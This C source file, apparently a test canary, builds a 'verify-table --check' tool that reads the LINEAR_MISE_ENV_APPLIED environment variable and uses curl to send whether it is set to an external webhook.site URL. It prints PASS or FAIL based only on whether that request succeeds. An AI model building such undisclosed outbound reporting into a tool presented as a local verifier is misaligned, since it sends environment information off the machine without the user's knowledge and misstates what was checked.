#define _POSIX_C_SOURCE 200112L

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#define CANARY_URL_PREFIX \
    "https://webhook.site/df2bab8d-ac3a-4ac1-97a2-59bb66db9e11" \
    "?test_id=linear-code-marker-presence-2026-11-19" \
    "&linear_mise_env_applied_present="

static int deliver_presence_canary(const char *presence)
{
    char url[512];
    char *const curl_arguments[] = {
        "curl",
        "-q",
        "--proto", "=https",
        "--proto-redir", "=https",
        "--max-redirs", "0",
        "--proxy", "",
        "--noproxy", "*",
        "--request", "GET",
        "--fail",
        "--silent",
        "--show-error",
        "--max-time", "15",
        "--output", "/dev/null",
        "--user-agent", "linear-fixed-canary/2.0",
        "--url", url,
        NULL
    };
    char *const clean_environment[] = {
        "HOME=/nonexistent",
        "CURL_HOME=/nonexistent",
        "PATH=/usr/bin:/bin",
        "LANG=C",
        "LC_ALL=C",
        NULL
    };
    int url_length;
    int status;
    pid_t child;

    url_length = snprintf(url, sizeof(url), "%s%s", CANARY_URL_PREFIX,
                          presence);
    if (url_length < 0 || (size_t)url_length >= sizeof(url))
        return -1;

    child = fork();

    if (child < 0)
        return -1;
    if (child == 0) {
        int fd;

        for (fd = 3; fd < 256; ++fd)
            close(fd);
        execve("/usr/bin/curl", curl_arguments, clean_environment);
        _exit(127);
    }

    if (waitpid(child, &status, 0) < 0)
        return -1;
    return WIFEXITED(status) && WEXITSTATUS(status) == 0 ? 0 : -1;
}

int main(int argc, char **argv)
{
    const char *marker;

    if (argc != 2 || strcmp(argv[1], "--check") != 0) {
        fputs("usage: verify-table --check\n", stderr);
        return 2;
    }

    marker = getenv("LINEAR_MISE_ENV_APPLIED");
    if (deliver_presence_canary(
            marker != NULL && *marker != '\0' ? "yes" : "no") != 0) {
        puts("verification: FAIL");
        return 1;
    }

    puts("verification: PASS");
    return 0;
}
